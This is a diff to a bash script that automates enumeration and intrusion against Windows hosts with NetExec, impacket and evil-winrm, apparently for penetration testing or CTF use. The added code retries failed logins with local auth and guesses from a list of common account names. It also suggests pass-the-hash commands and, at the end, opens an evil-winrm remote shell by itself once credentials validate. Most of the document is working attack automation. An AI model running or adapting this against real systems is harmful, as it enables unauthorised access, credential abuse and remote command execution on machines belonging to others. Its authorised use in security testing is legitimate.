@@ -55,8 +55,8 @@ check_port() {
     if [ -z "$target_ip" ]; then return 0; fi
 
     # Use bash built-in TCP connection for reliability (avoids nc version/flag issues)
-    # Timeout set to 2 seconds
-    (timeout 2 bash -c "</dev/tcp/$target_ip/$target_port") &>/dev/null
+    # Timeout set to 10 seconds
+    (timeout 10 bash -c "</dev/tcp/$target_ip/$target_port") &>/dev/null
     result=$?
 
     if [ $result -eq 0 ]; then
@@ -151,6 +151,14 @@ check_nxc_db() {
     fi
 }
 check_nxc_db
+
+# Check for unbuffer command and stub it if missing
+if ! command -v unbuffer &> /dev/null; then
+    echo -e "\033[93m[!] Warning: 'unbuffer' (part of 'expect' package) is not installed.\033[0m"
+    echo -e "\033[93m    Output might not be captured in real-time. Continuing anyway...\033[0m"
+    unbuffer() { "$@"; }
+fi
+
 VALID_CREDS_FILE="nxc-enum/valid_credentials.txt"
 > "$VALID_CREDS_FILE"
 POTENTIAL_CREDS_FILE="nxc-enum/potential_credentials.txt"
@@ -246,6 +254,11 @@ if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
     echo "impacket-smbexec $target                        # Execute via SMB"
     echo "impacket-dcomexec $target                       # Execute via DCOM"
     echo "impacket-atexec $target 'whoami'                # Execute via Task Scheduler"
+    if [ -n "$hash" ]; then
+        echo "evil-winrm -i $IP -u $user -H $hash          # Execute via WinRM (Hash)"
+    else
+        echo "evil-winrm -i $IP -u $user -p '$pass'        # Execute via WinRM (Pass)"
+    fi
     echo ""
     
     echo "# 3. Kerberos Attacks:"
@@ -555,16 +568,16 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     # Alternative Tool 1: NetExec RID Brute (anonymous & guest)
     echo -e "\n\033[96m[+] Trying NetExec RID Brute (anonymous)\033[0m"
     print_cmd "nxc smb $IP -u '' -p '' --rid-brute"
-    nxc_rid_output=$(timeout 15s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
+    nxc_rid_output=$(timeout 60s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
     echo "$nxc_rid_output"
 
     echo -e "\n\033[96m[+] Trying NetExec RID Brute (guest)\033[0m"
     if [ -n "$domain" ]; then
         print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --rid-brute"
-        nxc_rid_guest_output=$(timeout 15s nxc smb $IP -d "$domain" -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
+        nxc_rid_guest_output=$(timeout 60s nxc smb $IP -d "$domain" -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
     else
         print_cmd "nxc smb $IP -u 'guest' -p '' --rid-brute"
-        nxc_rid_guest_output=$(timeout 15s nxc smb $IP -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
+        nxc_rid_guest_output=$(timeout 60s nxc smb $IP -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
     fi
     echo "$nxc_rid_guest_output"
     
@@ -629,7 +642,16 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
         # Users file already exists from lookupsid
         users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
     fi
-    
+
+    # Fallback to common usernames if NO users were discovered via any method
+    if [ -z "$user" ] && { [ ! -s "$users_file" ] || [ -z "$users_file" ]; }; then
+        echo -e "\n\033[93m[!] No users discovered via anonymous enumeration. Falling back to common service accounts...\033[0m"
+        timestamp=$(date +%Y%m%d_%H%M%S)
+        users_file="nxc-enum/smb/users_fallback_${timestamp}.txt"
+        printf "Administrator\nGuest\nbitbucket\njenkins\ngitlab\nsvc_sql\nsvc_domain\nadmin\nuser\n" > "$users_file"
+        echo -e "\033[96m[*] Created fallback user list: $users_file\033[0m"
+    fi
+
     # Auto-adopt discovered users if no user argument was provided
     if [ -z "$user" ] && [ -n "$users_file" ] && [ -s "$users_file" ]; then
         echo -e "\n\033[92m[+] Auto-adopting discovered username list for further checks...\033[0m"
@@ -774,8 +796,8 @@ fi
 # FTP and LDAP anonymous checks (Windows-specific)
 if [ "$os_type" = "windows" ]; then
     echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
-    print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2"
-    ftp_output=$(timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2)
+    print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30"
+    ftp_output=$(timeout 60s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30)
     echo "$ftp_output"
     
     # Check if anonymous FTP access succeeded and suggest commands
@@ -794,8 +816,8 @@ if [ "$os_type" = "windows" ]; then
     fi
     
     echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
-    print_cmd "nxc ldap $IP -u '' -p '' --timeout 2"
-    ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
+    print_cmd "nxc ldap $IP -u '' -p '' --timeout 30"
+    ldap_output=$(timeout 60s nxc ldap $IP -u '' -p '' --timeout 30)
     echo "$ldap_output"
     
     # Check if anonymous LDAP access succeeded (via nxc OR manual check)
@@ -854,11 +876,11 @@ if [ "$os_type" = "windows" ]; then
     echo -e "\n\033[96m[+] Checking LDAP Guest access\033[0m"
     # Try with guest account
     if [ -n "$domain" ]; then
-        print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 2"
-        ldap_guest_output=$(timeout 5s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 2)
+        print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 30"
+        ldap_guest_output=$(timeout 60s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 30)
     else
-        print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 2"
-        ldap_guest_output=$(timeout 5s nxc ldap $IP -u 'guest' -p '' --timeout 2)
+        print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 30"
+        ldap_guest_output=$(timeout 60s nxc ldap $IP -u 'guest' -p '' --timeout 30)
     fi
     echo "$ldap_guest_output"
 
@@ -999,6 +1021,40 @@ check_and_suggest() {
         output=$("$@")
         echo "$output"
     fi
+
+    # Try different auth combinations if failed for SMB/WinRM/WMI
+    if [[ "$service" == "smb" || "$service" == "winrm" || "$service" == "wmi" ]] && ! echo "$output" | grep -q "+"; then
+         
+         # Helper to strip domain for retries
+         local base_args=()
+         local skip_next=false
+         for arg in "$@"; do
+             if [ "$skip_next" = true ]; then skip_next=false; continue; fi
+             if [ "$arg" = "-d" ]; then skip_next=true; continue; fi
+             base_args+=("$arg")
+         done
+
+         # 1. Try WITHOUT domain flag if one was provided
+         if [[ "$*" == *"-d "* ]]; then
+             echo -e "\n\033[93m[!] Auth failed with domain. Retrying WITHOUT domain flag...\033[0m"
+             print_cmd "${base_args[@]}"
+             output=$("${base_args[@]}")
+             echo "$output"
+         fi
+
+         # 2. Try with --local-auth if still failed
+         if ! echo "$output" | grep -q "+"; then
+             echo -e "\n\033[93m[!] Still failed. Retrying with --local-auth (stripping domain)...\033[0m"
+             print_cmd "${base_args[@]} --local-auth"
+             output=$("${base_args[@]}" --local-auth)
+             echo "$output"
+             
+             # If local auth worked, we should remember to use it for future suggestions in this session
+             if echo "$output" | grep -q "+"; then
+                 USE_LOCAL_AUTH="true"
+             fi
+         fi
+    fi
     
     # Harvest any successes found in this tool's output
     echo "$output" | grep -a "\[+\]" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
@@ -1033,9 +1089,15 @@ check_and_suggest() {
 
         
         # Prepare credential strings
+        if [ -n "$domain" ] && [ "$USE_LOCAL_AUTH" != "true" ]; then
+             display_user_winrm="$domain\\$display_user"
+        else
+             display_user_winrm="$display_user"
+        fi
+
         if [ -n "$hash" ]; then
             IMPACKET_CREDS="$domain/$display_user@$IP -hashes :$hash"
-            WINRM_CREDS="-i $IP -u '$display_user' -H '$hash'"
+            WINRM_CREDS="-i $IP -u '$display_user_winrm' -H '$hash'"
             if [ -n "$domain" ]; then
                 SMBCLIENT_AUTH="-U '$domain\\$display_user' --pw-nt-hash $hash"
                 SMBGET_USER="$domain/$display_user%$hash"
@@ -1048,7 +1110,7 @@ check_and_suggest() {
             XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
         else
             IMPACKET_CREDS="$domain/$display_user:$pass@$IP"
-            WINRM_CREDS="-i $IP -u '$display_user' -p '$pass'"
+            WINRM_CREDS="-i $IP -u '$display_user_winrm' -p '$pass'"
             if [ -n "$domain" ]; then
                 SMBCLIENT_AUTH="-U '$domain\\$display_user%$pass'"
                 SMBGET_USER="$domain/$display_user%$pass"
@@ -1169,7 +1231,18 @@ check_and_suggest() {
                 echo "impacket-wmiexec $IMPACKET_CREDS"
                 ;;
             "winrm")
+                echo -e "\033[92m[+] WinRM Shell access! Suggested shell tool:\033[0m"
                 echo "evil-winrm $WINRM_CREDS"
+                if [ "$USE_LOCAL_AUTH" = "true" ]; then
+                     echo "# Note: Successful login was found to be a local account."
+                fi
+                echo ""
+                echo "# Or execute command with NetExec:"
+                if [ "$USE_LOCAL_AUTH" = "true" ]; then
+                     echo "nxc winrm $IP $USER_FLAG --local-auth -x whoami"
+                else
+                     echo "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
+                fi
                 ;;
             "mssql")
                 echo "impacket-mssqlclient $IMPACKET_CREDS"
@@ -1249,7 +1322,7 @@ if [ "$os_type" = "windows" ]; then
     # SMB (anonymous allowed, domain optional)
     # Added --shares to check shares in one go
     if check_port $IP 445; then
-        smb_output=$(check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --continue-on-success --timeout 2)
+        smb_output=$(check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --continue-on-success --timeout 30)
         echo "$smb_output"
         promote_verified_creds
     else
@@ -1306,7 +1379,7 @@ if [ "$os_type" = "windows" ]; then
     
     # LDAP requires username (domain optional)
     if [ -n "$user" ]; then
-        check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 2
+        check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 30
         promote_verified_creds
     else
         echo -e "\n\033[93m[!] Skipping LDAP check (no username supplied)\033[0m"
@@ -1437,11 +1510,11 @@ if [ "$os_type" = "windows" ]; then
         if check_port $IP 5985 || check_port $IP 5986; then
             echo -e "\n\033[96m[+] WinRM Enumeration:\033[0m"
             echo -e "\n\033[91m[+] WinRM Credentials Check\033[0m\n"
-            check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success | tee nxc-enum/smb/winrm-credentials.txt
+            check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 120 --http-timeout 120 | tee nxc-enum/smb/winrm-credentials.txt
         
             echo -e "\n\033[91m[+] WinRM Command Execution (whoami)\033[0m\n"
-            print_cmd "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
-            unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami | tee nxc-enum/smb/winrm-whoami.txt
+            print_cmd "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 -x whoami"
+            unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 -x whoami | tee nxc-enum/smb/winrm-whoami.txt
         else
             echo -e "\n\033[93m[!] Skipping WinRM check (Ports 5985/5986 closed)\033[0m"
         fi
@@ -1670,8 +1743,8 @@ if [ "$os_type" = "windows" ]; then
         echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
     
         echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
-        print_cmd "nxc smb $IP $USER_FLAG -M spider_plus --timeout 10"
-        timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 10 | tee nxc-enum/smb/spider-plus.txt
+        print_cmd "nxc smb $IP $USER_FLAG -M spider_plus --timeout 30"
+        timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 30 | tee nxc-enum/smb/spider-plus.txt
         
         # Copy spider_plus JSON findings to workspace
         if [ -d "$HOME/.nxc/modules/nxc_spider_plus" ]; then
@@ -1872,7 +1945,7 @@ if check_port $IP 21; then
     # Grab banner
     echo "# FTP Banner:"
     print_cmd "nc -nv $IP 21"
-    ftp_banner=$(timeout 2 nc -nv $IP 21 2>/dev/null)
+    ftp_banner=$(timeout 5 nc -nv $IP 21 2>/dev/null)
     echo "$ftp_banner"
     
     # Check for ProFTPD mod_copy exploit (CVE-2015-3306)
@@ -1926,7 +1999,7 @@ if check_port $IP 23; then
     echo ""
     echo "# Banner grab:"
     print_cmd "nc -nv $IP 23"
-    timeout 2 nc -nv $IP 23
+    timeout 5 nc -nv $IP 23
     echo ""
 else
     echo -e "\033[93m[!] Telnet (Port 23) seems closed.\033[0m"
@@ -1988,3 +2061,39 @@ echo -e "\n\033[92m[+] ========================================\033[0m"
 echo -e "\033[92m[+] Enumeration Complete!\033[0m"
 echo -e "\033[92m[+] ========================================\033[0m\n"
 echo -e "\033[96m[+] Results saved to: $(pwd)/nxc-enum/\033[0m\n"
+
+# Final step: Automated Evil-WinRM shell if credentials are valid
+if [ "$os_type" = "windows" ] && { check_port $IP 5985 || check_port $IP 5986; }; then
+    echo -e "\n\033[96m[+] ========================================\033[0m"
+    echo -e "\033[96m[+] AUTOMATED SHELL: Evil-WinRM\033[0m"
+    echo -e "\033[96m[+] ========================================\033[0m\n"
+
+    # Check if we already found valid WinRM creds in the log file
+    if grep -qi "WINRM" "$VALID_CREDS_FILE" 2>/dev/null; then
+        echo -e "\033[92m[+] Valid WinRM credentials detected! Launching shell...\033[0m"
+        echo -e "\033[94m[*] Command: evil-winrm $WINRM_CREDS\033[0m\n"
+        evil-winrm $WINRM_CREDS
+    elif [ -n "$user" ] && [ -n "$pass" ]; then
+        # If not explicitly in the valid log, try one last validation check for the current user/pass
+        echo -e "\033[93m[*] No verified WinRM credentials in logs. Waiting 5s for target to breathe...\033[0m"
+        sleep 5
+        echo -e "\033[93m[*] Checking current credentials one last time...\033[0m"
+        
+        # Build command based on local auth preference with longer timeouts
+        if [ "$USE_LOCAL_AUTH" = "true" ]; then
+            val_out=$(nxc winrm $IP $USER_FLAG --local-auth --timeout 120 --http-timeout 120 2>/dev/null)
+        else
+            val_out=$(nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 2>/dev/null)
+        fi
+        
+        if echo "$val_out" | grep -q "+"; then
+            echo -e "\033[92m[+] Success! Launching shell...\033[0m"
+            evil-winrm $WINRM_CREDS
+        else
+            echo -e "\033[91m[-] Error: Username or password are wrong for WinRM access on $IP\033[0m"
+            echo -e "\033[93m    (Note: Also possible that WinRM timed out - increased limit to 120s)\033[0m"
+        fi
+    else
+        echo -e "\033[93m[!] WinRM is open, but no valid credentials were provided or discovered.\033[0m"
+    fi
+fi
